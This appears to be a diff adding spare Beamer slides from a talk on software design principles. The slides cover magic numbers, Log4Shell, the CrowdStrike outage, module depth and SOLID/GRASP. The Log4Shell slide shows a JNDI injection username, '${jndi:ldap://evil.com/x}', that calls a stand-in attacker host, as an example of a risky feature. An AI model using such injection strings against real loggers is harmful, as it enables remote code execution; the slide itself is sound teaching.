@@ -1,0 +1,197 @@
+% Slides kept for reference and not loaded by main.tex.
+
+% From 01-bad-practices.tex
+\begin{frame}[fragile]{Example 2}
+
+    \vfill
+
+    \begin{minted}[xleftmargin=0.05\linewidth, xrightmargin=0.05\linewidth]{python}
+    data = load_instrument("run_042.dat")  # raw device data
+
+    def peak_energy(data):
+        return data[:, 3].max() * 0.0259  # column 3 + magic number (gain=0.0259)
+
+    def background(data):
+        return data[:100, 3].mean()  # column 3 again
+    \end{minted}
+
+    \pause
+
+    \vfill
+
+    \centering
+    \takeaway{What if the \path{run_042.dat} changes format?}
+
+    \vfill
+
+    You need to change the code at 2 places.
+
+    \vfill
+
+\end{frame}
+
+
+
+% From 01-bad-practices.tex
+\begin{frame}[fragile]{Log4Shell (2021)}
+
+    \begin{columns}[T]
+        \column{0.5\textwidth}
+        \begin{itemize}
+            \item Log4j: the most used Java logging library
+            \item Flaw: it could interpret your username and execute malicious code.
+        \end{itemize}
+
+        \column{0.46\textwidth}
+        \begin{minted}{java}
+        logger.info("Login: " + username);
+        \end{minted}
+        \pause
+        \begin{minted}{java}
+        // username =
+        //   "${jndi:ldap://evil.com/x}"
+        \end{minted}
+    \end{columns}
+
+    \takeaway{A logger that downloads code: every extra and unrelated feature is extra risk.}
+\end{frame}
+
+
+
+% From 01-bad-practices.tex
+\begin{frame}{CrowdStrike (2024)}
+    \source{crowdstrike2024rca}
+
+    \begin{columns}[T]
+        \column{0.5\textwidth}
+        \begin{itemize}
+            \item Routine content update for a security product
+            \item The new template expected 21 input fields; the code supplied 20
+            \item Reading the missing 21st field crashed a Windows driver
+            \item Airlines, banks and hospitals went down
+        \end{itemize}
+
+        \column{0.46\textwidth}
+        \centering
+        % 20 fields received, the 21st is read anyway
+        \begin{tikzpicture}
+            \node[anchor=south west, font=\scriptsize, text=talkfg] at (0,0.35)
+                {expected: 21 fields};
+            \foreach \i in {0,...,19}
+                \fill[talkblue] ({\i*0.3},0) rectangle ++(0.24,0.24);
+            \draw[talkbad, thick, dashed] (6.0,0) rectangle ++(0.24,0.24);
+            \node[anchor=north west, font=\scriptsize, text=talkfg] at (0,-0.1)
+                {received: 20};
+            \node[anchor=north east, font=\scriptsize\ttfamily, text=talkbad] at (6.24,-0.1)
+                {fields[20]};
+        \end{tikzpicture}
+
+        \pause
+        \vspace{0.8em}
+        {\small In Python: \texttt{IndexError}.\\ In a driver: blue screen.\par}
+        \vspace{0.8em}
+        \bigstat{8.5\,M}{Windows machines down}
+    \end{columns}
+
+    \pause
+    \vfill
+
+    \begin{center}
+        \takeaway{Protect Variations: one place knows and checks the format.}
+    \end{center}
+
+\end{frame}
+
+
+
+
+
+
+% From 02-complexity.tex
+\begin{frame}[fragile]{Deep and shallow modules}
+
+    \begin{columns}[T]
+        \column{0.48\textwidth}
+        \centering
+        \begin{tikzpicture}
+            \fill[talkaccent] (0,3.0) rectangle (1.6,3.2);
+            \draw[talkblue, thick, fill=codebg] (0,0) rectangle (1.6,3.0);
+            \node[talkfg] at (0.8,1.5) {work};
+        \end{tikzpicture}
+
+        \textbf{Deep}: small interface, lots of work
+
+        \vspace{0.5em}
+        {\small\mintinline{python}{np.linalg.solve(A, b)}}
+
+        \column{0.48\textwidth}
+        \centering
+        \begin{tikzpicture}
+            \path (0,0) -- (0,0);   % same height as the deep one
+            \fill[talkaccent] (0,3.0) rectangle (5.0,3.2);
+            \draw[talkblue, thick, fill=codebg] (0,2.4) rectangle (5.0,3.0);
+            \node[talkfg] at (2.5,2.7) {work};
+        \end{tikzpicture}
+
+        \textbf{Shallow}: big interface, little work
+
+        \vspace{0.5em}
+        {\small\mintinline{python}{fit(data, n, tol, step, cache, v2)}}
+    \end{columns}
+
+    \vfill
+
+    \begin{center}
+    \textcolor{talkaccent}{\rule{1em}{0.6ex}} interface: what you must know (\textbf{cost})
+        \qquad
+    \textcolor{talkblue}{\rule{1em}{0.6ex}} body: what it does for you (\textbf{benefit})
+
+    \end{center}
+
+    \takeaway{Use a function knowing \textit{what} it does, not \textit{how}.}
+\end{frame}
+
+
+
+% From 05-design-principles.tex
+\begin{frame}[fragile]{Keep contracts honest}
+    \framesubtitle{Liskov Substitution \textperiodcentered{} Interface Segregation}
+
+    \begin{columns}[T]
+        \column{0.48\textwidth}
+        \textbf{A subclass keeps its parent's promise}
+        \inputminted{python}{code/design/contracts_subclass.py}
+        \small Code using \texttt{Body} never has to check for \texttt{Wall}.
+
+        \pause
+        \column{0.48\textwidth}
+        \textbf{An interface only asks what all can do}
+        \inputminted{python}{code/design/contracts_interface.py}
+        \small Drag has no potential energy: it shouldn't have to pretend.
+    \end{columns}
+
+    \takeaway{A contract only helps if every class can keep it.}
+\end{frame}
+
+
+
+% From 05-design-principles.tex
+\begin{frame}{Where these come from}
+
+    \centering\small
+    \begin{tabular}{lll}
+        \textbf{In this talk} & \textbf{GRASP} & \textbf{SOLID} \\ \hline
+        Separate logic from input/output & High Cohesion & Single Responsibility \\
+        Put behaviour with its data & Information Expert & \\
+        Know as little as possible & Low Coupling & \\
+        Pass in the part that varies & Polymorphism & Open/Closed \\
+        Inject what you depend on & Protected Variations & Dependency Inversion \\
+        Keep contracts honest & & Liskov Substitution, Interface Segregation \\
+    \end{tabular}
+
+    \vfill
+    \raggedright
+    \small\textcolor{talkdim}{Design pattern used: Strategy. Not covered (GRASP): Creator, Controller, Indirection, Pure Fabrication.}
+
+    \takeaway{Different names, same goal: low coupling, high cohesion.}
+\end{frame}
